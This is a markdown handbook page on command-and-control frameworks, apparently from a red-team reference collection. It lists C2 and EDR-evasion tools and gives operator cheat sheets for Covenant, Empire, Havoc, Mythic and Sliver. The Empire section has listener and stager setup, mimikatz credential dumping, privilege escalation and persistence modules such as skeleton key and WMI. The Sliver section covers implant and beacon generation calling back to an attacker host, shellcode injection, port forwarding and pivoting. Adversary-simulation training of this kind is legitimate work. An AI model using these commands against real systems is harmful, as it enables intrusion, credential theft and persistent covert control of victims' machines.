# Command and Control

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Resources)

## Table of Contents

- [Covenant](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Covenant)
- [Empire](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Empire)
- [Havoc](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Havoc)
- [Mythic](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Mythic)
- [Sliver](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Sliver)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AzureC2Relay | AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile. | https://github.com/Flangvik/AzureC2Relay |
| Brute Ratel | A Customized Command and Control Center for Red Team and Adversary Simulation | https://bruteratel.com/ |
| SharpC2 | Command and Control Framework written in C# | https://github.com/rasta-mouse/SharpC2 |
| Cobalt Strike | Adversary Simulation and Red Team Operations | https://www.cobaltstrike.com/ |
| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
| Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
| KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
| MoveKit | Cobalt Strike kit for Lateral Movement | https://github.com/0xthirteen/MoveKit |
| Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
| NimPlant | A light-weight first-stage C2 implant written in Nim. | https://github.com/chvancooten/NimPlant |
| PoshC2 | A proxy aware C2 framework used to aid red teamers with post-exploitation and lateral movement. | https://github.com/nettitude/PoshC2 |
| RedWarden | Cobalt Strike C2 Reverse proxy that fends off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation | https://github.com/mgeeky/RedWarden |
| SILENTTRINITY | An asynchronous, collaborative post-exploitation agent powered by Python and .NET's DLR | https://github.com/byt3bl33d3r/SILENTTRINITY |
| Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
| SharpLAPS | Retrieve LAPS password from LDAP | https://github.com/swisskyrepo/SharpLAPS |
| SPAWN | Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing. | https://github.com/boku7/SPAWN |

## Covenant

> https://github.com/cobbr/Covenant

> https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### Prerequisites

```c
$ sudo apt-get install docker docker-compose
```

### Installation

```c
$ git clone --recurse-submodules https://github.com/cobbr/Covenant
$ cd Covenant/Covenant
$ docker build -t covenant .
```

```c
$ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

> https://127.0.0.1:7443/covenantuser/login

### Stop Covenant

```c
$ docker stop covenant
```

### Restart Covenant

```c
$ docker start covenant -ai
```

### Remove and Restart Covenant

```c
$ ~/Covenant/Covenant > docker rm covenant
$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
```

## Empire

> https://github.com/BC-SECURITY/Empire

> https://hackmag.com/security/powershell-empire/

### Basic Commands

```c
(Empire) > listeners                      // list current running listeners
(Empire) > uselistener                    // configure listener
(Empire) > agents                         // list available agents
(Empire) > kill <NAME>                    // kill a specific agent
(Empire: listeners/http) > info           // provide information about used listener or module
(Empire: listeners/http) > back           // get back from current menu
(Empire: listeners) > usestager           // creating payloads
(Empire: agents) > rename <NAME> <NAME>   // renaming specific agent
(Empire: agents) > interact <NAME>        // interacting with specific agent
(Empire: agents) > searchmodule <NAME>    // search for a specific module
(Empire: <NAME>) > usemodule <NAME>       // use a specific module
(Empire: <NAME>) > sysinfo                // show system information
(Empire: <NAME>) > creds                  // show credentials
(Empire: <NAME>) > download               // download files
(Empire: <NAME>) > upload                 // upload files
(Empire: <NAME>) > sleep <60>             // set agent communication to sleep for 60 seconds
(Empire: <NAME>) > steal_token            // impersonate access token
(Empire: <NAME>) > shell [cmd]            // open a shell with cmd.exe
(Empire: <NAME>) > ps                     // show running processes
(Empire: <NAME>) > psinject               // inject agent to another process
(Empire: <NAME>) > scriptimport           // load powershell script
(Empire: <NAME>) > mimikatz               // executes sekurlsa::logonpasswords
(Empire: <NAME>) > usemodule privesc/getsystem            // try privilege escalation
(Empire: <NAME>) > usemodule privesc/sherlock             // run sherlock
(Empire: <NAME>) > usemodule privesc/powerup/allchecks    // perform privilege escalation checks
(Empire: <NAME>) > usemodule situational_awareness/host/antivirusproduct    // provides information about antivirus products
(Empire: <NAME>) > usemodule situational_awareness/host/applockerstatus     // provides information about applocker status
(Empire: <NAME>) > usemodule situational_awareness/host/computerdetails     // provides information about event ids 4648 (RDP) and 4624 (successful logon)
(Empire: <NAME>) > situational_awareness/network/get_spn                       // provides information about spns
(Empire: <NAME>) > situational_awareness/network/powerview/get_domain_trust    // show information about domain trusts
(Empire: <NAME>) > situational_awareness/network/powerview/map_domain_trust    // map information about domain trust
(Empire: <NAME>) > situational_awareness/network/bloodhound3                   // load bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > set CollectionMethodAll    // configure bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > run                        // run the module
(Empire: <NAME>) > download *bloodhound*                                                // download the module
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry    // registry persistence
(Empire: <NAME>) > usemodule persistence/misc/add_sid_history            // sid history persistence
(Empire: <NAME>) > usemodule persistence/misc/memssp                     // ssp persistence
(Empire: <NAME>) > usemodule persistence/misc/skeleton_key               // skeleton key persistence
(Empire: <NAME>) > usemodule persistence/elevated/wmi                    // wmi persistence
```

### Setup HTTP Listener

```c
(Empire) > listeners http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Name <NAME>
(Empire: listeners/http) > set Host <LHOST>
(Empire: listeners/http) > set Port <Port>
(Empire: listeners/http) > exeute
```

### Setup Stager

```c
(Empire: listeners) > usestager multi/bash
(Empire: listeners/multi/bash) > set Listener <NAME>
(Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
(Empire: listeners/multi/bash) > execute
```

### Setup Persistence Measures

```c
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
(Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
(Empire: <NAME>/powershell/persistence/elevated/registry) > run
```

## Havoc

> https://github.com/HavocFramework/Havoc

### Python Environment

```c
$ sudo apt-get install build-essential
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt-get update
$ sudo apt-get install python3.10 python3.10-dev
```

### Prerequisites

```c
$ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
```

### Installation

#### Building Client

```c
user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
user@host:/opt$ cd Havoc/Client
user@host:/opt/Havoc/Client$ make 
user@host:/opt/Havoc/Client$ ./Havoc
```

#### Building Teamserver

```c
user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
user@host:/opt/Havoc/Teamserver$ ./Install.sh
user@host:/opt/Havoc/Teamserver$ make
user@host:/opt/Havoc/Teamserver$ ./teamserver -h
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Teamserver

```c
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Client

```c
user@host:/opt/Havoc/Client$ ./Havoc
```

## Mythic

> https://github.com/its-a-feature/Mythic

> https://docs.mythic-c2.net/

> https://github.com/MythicAgents

> https://github.com/MythicC2Profiles

### Installation

```c
$ git clone https://github.com/its-a-feature/Mythic
$ cd Mythic
$ sudo ./install_docker_ubuntu.sh
$ sudo make
```

### Install Apollo

```c
$ sudo -E ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

### Install HTTP C2 Profile

```c
$ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

### Finalize the Installation

```c
$ sudo ./mythic-cli start
$ cat .env
```

> https://127.0.0.1:7443

## Sliver

> https://github.com/BishopFox/sliver

> https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2

### Installation

```c
$ curl https://sliver.sh/install | sudo bash
```

#### Start Sliver

```c
$ sudo systemctl enable sliver.service
$ sudo systemctl start sliver.service
$ sliver
```

### Administration

```c
sliver > version
sliver > players
sliver > armory
sliver > armory install all
```

### Multiplayer

#### Directory for Server Binary

```c
/root/sliver-server
```

#### Register a new Operator

```c
[server] sliver > multiplayer
[server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
```

#### Access with Custom Configuration File

```c
$ ./sliver-client import ./<USERNAME>_example.com.cfg
```

#### Kick Operator

```c
[server] sliver > kick-operator -n <USERNAME>
```

### Implant and Beacon Creation 

```
sliver > help generate
sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format sared --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format sared --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
```

### Profile Handling

```c
sliver (STALE_PNEUMONIA) > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe session_win_default
sliver (STALE_PNEUMONIA) > profiles generate --save /PATH/TO/BINARY session_win_default
sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
```

### Basic Commands, Implant and Beacon Handling

```c
sliver > mtls                                                             // Mutual Transport Layer Security
sliver > jobs                                                             // display current jobs
sliver > implants                                                         // show all created implants
sliver > sessions                                                         // display currently available sessions
sliver > sessions -i <ID>                                                 // interact with a session
sliver > use -i <ID>                                                      // interact with a session
sliver > sessions -k <ID>                                                 // kill a session
sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
sliver > tasks fetch 49ead4a9                                             // fetch a specific task
sliver (NEARBY_LANGUAGE) > info                                           // provide session information
sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell
sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
sliver (NEARBY_LANGUAGE) > background                                     // background the session
```

### Spawning new Sessions

```c
sliver (NEARBY_LANGUAGE) > interactive
sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
```

### Port Forwarding

```c
sliver (NEARBY_LANGUAGE) > portfwd
sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
```

### SOCKS Proxy

```c
sliver (NEARBY_LANGUAGE) > socks5 start
sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
```

### Pivoting

```c
sliver (NEARBY_LANGUAGE) > pivots tcp
sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:9898
sliver (NEARBY_LANGUAGE) > pivots
```
